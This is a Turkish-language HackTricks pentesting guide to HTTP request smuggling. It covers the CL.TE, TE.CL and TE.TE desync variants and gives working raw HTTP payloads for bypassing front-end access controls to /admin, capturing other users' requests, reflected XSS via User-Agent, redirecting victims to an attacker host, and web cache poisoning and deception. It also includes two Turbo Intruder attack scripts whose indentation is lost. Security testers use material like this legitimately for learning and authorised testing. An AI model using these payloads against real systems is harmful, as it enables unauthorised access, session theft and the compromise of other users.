# HTTP İstek Kaçırma / HTTP Desenk Atağı

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünleri**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Nedir

Bu zayıflık, **ön uç proxy'ler** ile **arka uç** sunucu arasındaki **desenkronizasyon** nedeniyle bir **saldırganın** bir HTTP **istek**i göndermesine olanak tanır. Bu istek, **ön uç** proxy'ler (yük dengeleyici/ters proxy) tarafından **tek bir istek** olarak **yorumlanacak** ve **arka uç** sunucu tarafından **2 istek** olarak **yorumlanacak** şekilde **gönderilir**.

### Teori

[**RFC Belirtimi (2161)**](https://tools.ietf.org/html/rfc2616)

> Bir mesaj, hem Bir Transfer-Encoding başlık alanı hem de Bir Content-Length başlık alanı ile alınırsa, ikincisi YOK SAYILMALIDIR.

**Content-Length**

> Content-Length varlık başlığı, alıcıya gönderilen varlık gövdesinin bayt cinsinden boyutunu belirtir.

**Transfer-Encoding: chunked**

> Transfer-Encoding başlığı, yükü güvenli bir şekilde kullanıcıya aktarmak için kullanılan kodlama biçimini belirtir.\
> Chunked, büyük verilerin bir dizi parçada gönderildiği anlamına gelir

### Gerçeklik

**Ön Uç** (yük dengeleyici / Ters Proxy) _**content-length**_ veya _**transfer-encoding**_ başlığını işlerken **Arka Uç** sunucu **diğerini işler** ve bu da 2 sistem arasında bir **desenkronizasyona** neden olur.\
Bu, bir saldırganın, ters proxy'ye gönderilen bir isteği **arka uç** sunucuya **2 farklı istek** olarak **yorumlayabilmesine** olanak tanır. Bu teknikteki **tehlike**, **arka uç** sunucunun **enjekte edilen 2. isteği** sanki **sonraki istemciden geldi** gibi **yorumlayacak** olması ve o istemcinin **gerçek isteğinin** enjekte edilen isteğin bir **parçası** olmasıdır.

### Özellikler

HTTP'de **bir yeni satır karakterinin 2 bayttan oluştuğunu** unutmayın:

* **Content-Length**: Bu başlık, isteğin **gövdesinin** bayt cinsinden **boyutunu** belirtmek için **ondalık sayı** kullanır. Gövde, son karakterde **bitmesi beklenir, isteğin sonunda yeni bir satıra gerek yoktur**.
* **Transfer-Encoding:** Bu başlık, **bir sonraki parçanın** **bayt sayısını** belirtmek için **hexadecimal sayı** kullanır. **Parça**, bir **yeni satır** ile **bitmelidir** ancak bu yeni satır **uzunluk göstergesi tarafından sayılmaz**. Bu aktarım yöntemi, **0 boyutunda bir parça ile biten 2 yeni satırı takip etmelidir**: `0`
* **Connection**: Deneyimime dayanarak, İstek Kaçırma'nın ilk isteğinde **`Connection: keep-alive`** kullanılması önerilir.

## Temel Örnekler

{% hint style="success" %}
Bu saldırıyı Burp Suite ile **denemeye çalışırken**, tekrarlayıcıda **`İçeriği Güncelle` ve `HTTP/1 satır sonlarını Normalize Et`** seçeneklerini devre dışı bırakın çünkü bazı cihazlar yeni satırları, taşıma dönüşlerini ve hatalı içerik uzunluklarını kötüye kullanır.
{% endhint %}

HTTP istek kaçırma saldırıları, ön uç ve arka uç sunucuların `Content-Length` (CL) ve `Transfer-Encoding` (TE) başlıklarını nasıl yorumladığındaki farklılıklardan yararlanan belirsiz istekler gönderilerek oluşturulur. Bu saldırılar, başlıkları önceliklendiren ön uç ve arka uç sunucuların bu farklılıkları nasıl işlediğine bağlı olarak **CL.TE**, **TE.CL** ve **TE.TE** şeklinde ortaya çıkabilir. Her tür, sunucuların aynı isteği farklı şekillerde işlemesinden kaynaklanan, beklenmeyen ve potansiyel olarak kötü amaçlı sonuçlara yol açan zayıflıkları temsil eder.

### Zayıflık Türlerinin Temel Örnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Zayıflığı (Ön Uç tarafından Content-Length kullanılırken, Arka Uç tarafından Transfer-Encoding kullanılır)

* **Ön Uç (CL):** İsteği `Content-Length` başlığına dayanarak işler.
* **Arka Uç (TE):** İsteği `Transfer-Encoding` başlığına dayanarak işler.
* **Saldırı Senaryosu:**
* Saldırgan, `Content-Length` başlığının değeri gerçek içerik uzunluğuyla eşleşmeyen bir istek gönderir.
* Ön uç sunucu, `Content-Length` değerine dayanarak tüm isteği arka uca iletir.
* Arka uç sunucu, `Transfer-Encoding: chunked` başlığı nedeniyle isteği parçalı olarak işler ve kalan verileri ayrı, sonraki bir istek olarak yorumlar.
*   **Örnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Zayıflığı (Ön Uç tarafından Transfer-Encoding kullanılırken, Arka Uç tarafından Content-Length kullanılır)

* **Ön Uç (TE):** İsteği `Transfer-Encoding` başlığına dayanarak işler.
* **Arka Uç (CL):** İsteği `Content-Length` başlığına dayanarak işler.
* **Saldırı Senaryosu:**
* Saldırgan, parçalı bir istek gönderir, burada parça boyutu (`7b`) ve gerçek içerik uzunluğu (`Content-Length: 4`) hizalanmaz.
* Ön uç sunucu, `Transfer-Encoding`i onaylayarak tüm isteği arka uca iletir.
* Arka uç sunucu, `Content-Length`i saygı göstererek, isteğin yalnızca başlangıç kısmını (`7b` bayt) işler ve geri kalanı istenmeyen bir sonraki isteğin bir parçası olarak bırakır.
*   **Örnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Zafiyeti (Her ikisi de tarafından kullanılan Transfer-Encoding ile obfuskasyon)

* **Sunucular:** Her ikisi de `Transfer-Encoding`i destekler, ancak obfuskasyon aracılığıyla birinin bunu görmezden gelmesi sağlanabilir.
* **Saldırı Senaryosu:**
* Saldırgan, obfuskasyonlu `Transfer-Encoding` başlıklarını içeren bir istek gönderir.
* Obfuskasyonun hangi sunucunun (ön uç veya arka uç) tanıyamadığına bağlı olarak CL.TE veya TE.CL zafiyeti sömürülebilir.
* Bir sunucu tarafından görülen işlenmemiş isteğin bir sonraki isteğin bir parçası haline gelmesi, smuggling'e yol açar.
*   **Örnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Her İki Ön Uç ve Arka Uç Tarafından Kullanılan Content-Length):**

* Her iki sunucu da isteği yalnızca `Content-Length` başlığına dayanarak işler.
* Bu senaryo genellikle smuggling'e yol açmaz, çünkü her iki sunucunun isteğin uzunluğunu nasıl yorumladığı konusunda uyum vardır.
*   **Örnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal İstek
```

#### **CL != 0 Senaryosu:**

* `Content-Length` başlığının var olduğu ve sıfır olmayan bir değere sahip olduğu senaryoları ifade eder, bu da istek gövdesinin içeriğe sahip olduğunu gösterir.
* Smuggling saldırılarını anlamak ve oluşturmak için önemlidir, çünkü sunucuların bir isteğin sonunu nasıl belirlediğini etkiler.
*   **Örnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Boş Olmayan Gövde
```

#### Hop-by-hop başlıklar aracılığıyla zorlama

Hop-by-hop başlıkları kötüye kullanarak proxy'e **Content-Length veya Transfer-Encoding başlığını silmesi için işaret edebilir ve böylece bir HTTP isteği smuggling saldırısının kötüye kullanılmasını mümkün kılabilirsiniz**.
```
Connection: Content-Length
```
**Hop-by-hop başlıklar hakkında daha fazla bilgi için** ziyaret edin:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP İstek Kaçırma Bulma

HTTP istek kaçırma açıklarını belirlemek genellikle sunucunun manipüle edilmiş isteklere yanıt vermesi ne kadar sürdüğünü gözlemleyen zamanlama teknikleri kullanılarak başarılabilir. Bu teknikler özellikle CL.TE ve TE.CL açıklarını tespit etmek için kullanışlıdır. Bu yöntemlerin yanı sıra, bu tür açıkları bulmak için kullanılabilecek diğer stratejiler ve araçlar bulunmaktadır:

### Zamanlama Teknikleri Kullanarak CL.TE Açıklarını Bulma

* **Yöntem:**
* Uygulama açıksa, sunucunun ek verileri beklemesine neden olacak bir istek gönderin.
*   **Örnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Gözlem:**
* Ön uç sunucusu isteği `Content-Length`'e göre işler ve mesajı erken keser.
* Beklenen bir parçalı mesaj olan arka uç sunucu, hiç gelmeyen bir sonraki parçayı beklerken gecikmeye neden olur.
* **Belirtiler:**
* Yanıtta zaman aşımı veya uzun gecikmeler.
* Arka uç sunucudan 400 Bad Request hatası almak, bazen detaylı sunucu bilgileriyle birlikte.

### Zamanlama Teknikleri Kullanarak TE.CL Açıklarını Bulma

* **Yöntem:**
* Uygulama açıksa, sunucunun ek verileri beklemesine neden olacak bir istek gönderin.
*   **Örnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Gözlem:**
* Ön uç sunucusu isteği `Transfer-Encoding`'e göre işler ve tüm mesajı iletilir.
* Beklenen bir mesaj olan arka uç sunucu, hiç gelmeyen ek verileri beklerken gecikmeye neden olur.

### Açıkları Bulmak İçin Diğer Yöntemler

* **Farklı Yanıt Analizi:**
* Bir isteğin hafif değişik versiyonlarını gönderin ve sunucu yanıtlarının beklenmedik bir şekilde farklılaşıp farklılaşmadığını gözlemleyin, bu da bir ayrıştırma uyumsuzluğunu gösterebilir.
* **Otomatik Araçlar Kullanma:**
* Burp Suite'in 'HTTP Request Smuggler' uzantısı gibi araçlar, çeşitli belirsiz istekler göndererek ve yanıtları analiz ederek bu açıkları otomatik olarak test edebilir.
* **Content-Length Farklılık Testleri:**
* Gerçek içerik uzunluğuyla uyumlu olmayan değişen `Content-Length` değerleriyle istekler gönderin ve sunucunun bu tür uyumsuzlukları nasıl işlediğini gözlemleyin.
* **Transfer-Encoding Farklılık Testleri:**
* Karışık veya hatalı `Transfer-Encoding` başlıkları içeren istekler gönderin ve ön uç ve arka uç sunucularının bu manipülasyonlara nasıl farklı yanıt verdiğini izleyin.

### HTTP İstek Kaçırma Açığı Test Etme

Zamanlama tekniklerinin etkinliğini doğruladıktan sonra, istemci isteklerinin manipüle edilip edilemeyeceğini doğrulamak çok önemlidir. Basit bir yöntem, örneğin, `/`'ye bir istek yaparak 404 yanıtı almayı denemektir. [Temel Örnekler](./#basic-examples) bölümünde önceki `CL.TE` ve `TE.CL` örnekleri, istemcinin farklı bir kaynağa erişmeyi amaçlasa da 404 yanıtı almak için istemci isteğini nasıl zehirleyeceğinizi göstermektedir.

**Ana Düşünceler**

Diğer isteklerle müdahale ederek istek kaçırma açıklarını test ederken aklınızda bulundurmanız gerekenler:

* **Farklı Ağ Bağlantıları:** "Saldırı" ve "normal" istekler ayrı ağ bağlantıları üzerinden gönderilmelidir. Her ikisi için aynı bağlantıyı kullanmak, açığın varlığını doğrulamaz.
* **Tutarlı URL ve Parametreler:** Her iki istek için aynı URL'leri ve parametre adlarını kullanmaya çalışın. Modern uygulamalar genellikle URL ve parametrelere göre belirli arka uç sunuculara istek yönlendirir. Bu eşleşmeler, her iki isteğin aynı sunucu tarafından işlenme olasılığını artırır, başarılı bir saldırı için gereklidir.
* **Zamanlama ve Yarış Koşulları:** "Normal" istek, "saldırı" isteğinden gelen müdahaleyi tespit etmeyi amaçlar ve diğer eşzamanlı uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteği "saldırı" isteğinden hemen sonra gönderin. Yoğun uygulamalar, kesin bir açık doğrulaması için birden fazla deneme gerektirebilir.
* **Yük Dengeleme Zorlukları:** Yük dengeleyici olarak hareket eden ön uç sunucular, istekleri çeşitli arka uç sistemlerine dağıtabilir. Eğer "saldırı" ve "normal" istekler farklı sistemlere düşerse, saldırı başarılı olmaz. Bu yük dengeleme yönü, bir açığı doğrulamak için birkaç deneme gerektirebilir.
* **Beklenmeyen Kullanıcı Etkisi:** Saldırınızın yanlışlıkla başka bir kullanıcının isteğini etkilediğini (tespit için gönderdiğiniz "normal" istek olmayan) fark ederseniz, bu saldırınızın başka bir uygulama kullanıcısını etkilediğini gösterir. Sürekli testler diğer kullanıcıları etkileyebilir, bu nedenle dikkatli bir yaklaşım gerekebilir.

## HTTP İstek Kaçırma Kötüye Kullanma

### Ön uç güvenlik kontrollerini atlatmak için

### HTTP İstek Kaçırma Yoluyla Ön Uç Güvenliğini Atlatma

Bazı durumlarda, ön uç proxy'ler gelen istekleri inceleyerek güvenlik önlemleri uygular. Ancak, bu önlemler HTTP İstek Kaçırma'yı kullanarak atlatılabilir, kısıtlı uç noktalara izinsiz erişime olanak tanır. Örneğin, `/admin`'e erişim dışarıdan engellenmiş olabilir ve ön uç proxy bu tür girişimleri aktif olarak engelleyebilir. Bununla birlikte, bu proxy, kaçırılmış bir HTTP isteği içinde gömülü istekleri incelemeyi ihmal edebilir, bu da bu kısıtlamaları atlamak için bir açık bırakır.

Ön uç güvenlik kontrollerini atlatmak için HTTP İstek Kaçırma'nın nasıl kullanılabileceğini gösteren aşağıdaki örnekleri düşünün, özellikle genellikle ön uç proxy tarafından korunan `/admin` yolunu hedef alanları:

**CL.TE Örneği**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldırısında, başlangıç isteği için `Content-Length` başlığı kullanılırken, ardışık gömülü istek `Transfer-Encoding: chunked` başlığını kullanır. Ön uç proxy'si başlangıç `POST` isteğini işler ancak gömülü `GET /admin` isteğini denetleyemez, bu da `/admin` yoluna izinsiz erişime izin verir.

**TE.CL Örneği**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Benzer şekilde, TE.CL saldırısında, ilk `POST` isteği `Transfer-Encoding: chunked` kullanır ve ardışık gömülü istek, `Content-Length` başlığına dayalı olarak işlenir. CL.TE saldırısına benzer şekilde, ön uç proxy, gizlice `/admin` yoluna erişim sağlayarak, gizlenmiş `GET /admin` isteğini göz ardı eder.

### Ön uç isteği yeniden yazma ortaya çıkarma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uç sunucuya iletmek öncesinde değiştirmek için bir **ön uç sunucusu** kullanır. Tipik bir değişiklik, `X-Forwarded-For: <İstemcinin IP'si>` gibi başlıklar eklemeyi içerir, istemcinin IP'sini arka uca iletmek için. Bu değişikliklerin anlaşılması önemli olabilir, çünkü bu, **korumaları atlamak** veya **gizlenmiş bilgileri veya uç noktaları ortaya çıkarmak** için yolları ortaya çıkarabilir.

Bir proxy'nin bir isteği nasıl değiştirdiğini araştırmak için, arka uç tarafından yanıtlanan bir POST parametresini bulun. Sonra, bu parametreyi en sona koyarak aşağıdaki gibi benzer bir istek oluşturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapıda, ardışık istek bileşenleri, yanıtta yansıtılan parametre olan `search=`'den sonra eklenir. Bu yansıma, ardışık isteğin başlıklarını ortaya çıkaracaktır.

Gömülü isteğin `Content-Length` başlığını gerçek içerik uzunluğuyla hizalamak önemlidir. Küçük bir değerle başlayıp kademeli olarak artırmak tavsiye edilir, çünkü çok düşük bir değer yansıtılan verileri kesebilirken, çok yüksek bir değer isteğin hata vermesine neden olabilir.

Bu teknik aynı zamanda bir TE.CL zafiyeti bağlamında da uygulanabilir, ancak istek `search=\r\n0` ile sonlandırılmalıdır. Yeni satır karakterlerinden bağımsız olarak, değerler arama parametresine eklenecektir.

Bu yöntem, öncelikle ön uç proxy tarafından yapılan istek değişikliklerini anlamak için hizmet verir, esasen kendi kendine yönlendirilen bir araştırma gerçekleştirir.

### Diğer kullanıcıların isteklerini yakalama <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST işlemi sırasında bir parametrenin değeri olarak belirli bir isteği ekleyerek, bir sonraki kullanıcının isteklerini yakalamak mümkündür. İşte bunun nasıl başarılacağı:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **yorum parametresi**, genel olarak erişilebilir bir sayfadaki bir gönderinin yorum bölümündeki içeriği depolamak amacıyla kullanılır. Sonraki isteğin içeriği bir yorum olarak görünecektir.

Ancak, bu teknik bazı sınırlamalara sahiptir. Genellikle, sadece kaçırılan isteğin kullanılan parametre ayırıcısına kadar olan verileri yakalar. URL kodlu form gönderimleri için bu ayırıcı, `&` karakteridir. Bu, kurban kullanıcının isteğinden yakalanan içeriğin ilk `&` karakterinde duracağı anlamına gelir, bu hatta sorgu dizesinin bir parçası olabilir.

Ayrıca, bu yaklaşımın TE.CL zafiyeti ile de mümkün olduğunu belirtmek önemlidir. Bu tür durumlarda, istek `search=\r\n0` ile sonuçlanmalıdır. Yeni satır karakterlerinden bağımsız olarak, değerler arama parametresine eklenecektir.

### Yansıtılan XSS'i sömürmek için HTTP isteği kaçırma kullanımı

HTTP İstek Kaçırma, web sayfalarını **Yansıtılan XSS**'e karşı savunmasız hale getiren web sayfalarını sömürmek için kullanılabilir ve önemli avantajlar sunar:

* Hedef kullanıcılarla etkileşim **gerektirmez**.
* Genellikle ulaşılamayan istek parçalarındaki XSS'in sömürülmesine **izin verir**, örneğin HTTP isteği başlıkları gibi.

Kullanıcı-Ajanı başlığı aracılığıyla Yansıtılan XSS'e duyarlı bir web sitesinin olduğu senaryolarda, aşağıdaki yük, bu zafiyetin nasıl sömürüleceğini göstermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Bu yük, zafiyeti sömürmek için yapılandırılmıştır:

1. `Transfer-Encoding: chunked` başlığı ile başlayan, görünüşte tipik bir `POST` isteği başlatma, böylece kaçakçılığın başlangıcını belirtir.
2. Chunked mesaj gövdesinin sonunu belirleyen `0` ile devam etme.
3. Ardından, kaçakçılık yapılmış bir `GET` isteği tanıtılır, burada `User-Agent` başlığına `<script>alert(1)</script>` betiği enjekte edilir ve sunucu bu sonraki isteği işlediğinde XSS tetiklenir.

`User-Agent`'ı kaçakçılık yoluyla manipüle ederek, yük normal istek kısıtlamalarını atlayarak, Reflected XSS zafiyetini standart olmayan ancak etkili bir şekilde sömürür.

### Bir site içi yönlendirmeyi açık yönlendirmeye dönüştürmek için HTTP isteği kaçakçılığı kullanma <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### HTTP İsteği Kaçakçılığı ile Site İçi Yönlendirmelerin Sömürülmesi <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle, yönlendirme URL'sindeki `Host` başlığından gelen ana bilgisayar adını kullanarak bir URL'den başka bir URL'ye yönlendirme yapar. Bu, Apache ve IIS gibi web sunucularıyla yaygındır. Örneğin, bir kesme işareti olmadan bir klasör istendiğinde, işaretçinin bir kesme işareti içerecek şekilde yönlendirilmesi sonucunu verir:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Sonuçlar:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bu davranış, HTTP isteği kaçırma kullanılarak kullanıcıların harici bir siteye yönlendirilmesi için manipüle edilebilir. Örneğin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaçak istek, işlenen sonraki kullanıcı isteğinin bir saldırgan tarafından kontrol edilen bir web sitesine yönlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Sonuçlar:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### HTTP İstek Kaçırma Kullanarak Web Önbellek Zehirlenmesi Gerçekleştirme <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### HTTP İstek Kaçırma Yoluyla Web Önbellek Zehirlenmesi Sömürme <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web önbellek zehirlenmesi, genellikle performansı artırmak amacıyla **ön uç altyapısının içeriği önbelleğe alması** durumunda gerçekleştirilebilir. Sunucunun yanıtını manipüle ederek, **önbelleği zehirlemek** mümkündür.

Daha önce, sunucu yanıtlarının nasıl değiştirilebileceğini ve 404 hatası döndürülebileceğini gözlemledik (bkz. [Temel Örnekler](./#basic-examples)). Benzer şekilde, sunucuyu, `/static/include.js` isteği için `/index.html` içeriğini döndürmeye kandırmak mümkündür. Sonuç olarak, `/static/include.js` içeriği, `/index.html`'in içeriğiyle önbellekte değiştirilir ve kullanıcılara erişilemez hale gelir, bu da Hizmet Reddi (DoS) saldırısına neden olabilir.

Bu teknik, bir **Açık Yönlendirme açığı** keşfedilirse veya bir **açık yönlendirmeye yönlendirme** varsa özellikle etkili hale gelir. Bu tür zafiyetler, `/static/include.js`'nin önbelleğindeki içeriği, saldırganın kontrolündeki bir betikle değiştirmek için sömürülebilir ve güncellenmiş `/static/include.js` isteyen tüm istemcilere karşı geniş çapta Bir Site Betik Saldırısı (XSS) saldırısını etkinleştirir.

Aşağıda, **ön uç yönlendirmesi ile açık yönlendirmeyi birleştirerek önbellek zehirlenmesini sömürme**nin bir örneği verilmiştir. Amaç, `/static/include.js` önbellek içeriğini saldırganın kontrolündeki JavaScript kodunu sunacak şekilde değiştirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Gömülü isteği `/post/next?postId=3` hedefleyen isteği dikkate alın. Bu istek, alan adını belirlemek için **Ana Bilgisayar başlık değerini** kullanarak `/post?postId=4`'e yönlendirilecektir. **Ana Bilgisayar başlığını** değiştirerek, saldırgan isteği kendi alan adlarına yönlendirebilir (**yerinde yönlendirme açık yönlendirmeye**).

Başarılı **soket zehirlenmesi** sonrasında `/static/include.js` için bir **GET isteği** başlatılmalıdır. Bu istek, önceki **yerinde yönlendirme açık yönlendirmeye** isteği tarafından kirletilecek ve saldırgan tarafından kontrol edilen betiğin içeriğini getirecektir.

Ardından, `/static/include.js` için yapılan herhangi bir istek, saldırganın betiğinin önbelleğe alınmış içeriğini sunacak ve etkili bir XSS saldırısı başlatacaktır.

### Web önbellek aldatmacası gerçekleştirmek için HTTP isteği kaçırma <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web önbellek zehirlenmesi ile web önbellek aldatmacası arasındaki fark nedir?**
>
> * **Web önbellek zehirlenmesinde**, saldırgan uygulamanın önbelleğe bazı kötü amaçlı içerikler depolamasına neden olur ve bu içerik önbellekten diğer uygulama kullanıcılarına sunulur.
> * **Web önbellek aldatmacasında**, saldırgan uygulamayı başka bir kullanıcıya ait hassas içerikleri önbelleğe almasına neden olur ve ardından bu içeriği önbellekten alır.
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Eğer bu kaçak istek önbelleği, statik içerik için amaçlanan bir önbellek girişini zehirlerse (örneğin, `/someimage.png`), kurbanın hassas verileri `/private/messages` altında statik içeriğin önbellek girişi altında önbelleğe alınabilir. Sonuç olarak, saldırgan bu önbelleğe alınmış hassas verileri potansiyel olarak alabilir.

### HTTP Yanıtı Desenkronizasyonu ile HTTP İstek Kaçakçılığını Silahlandırma

Bir HTTP İstek Kaçakçılığı açığı buldunuz ve nasıl sömürüleceğini bilmiyorsanız, bu başka bir sömürü yöntemini deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder betikleri

### CL.TE

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Araçlar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araç, tuhaf istek smugling farklılıklarını bulmak için kullanışlı olan dil tabanlı bir HTTP Fuzzer'dır.

## Referanslar

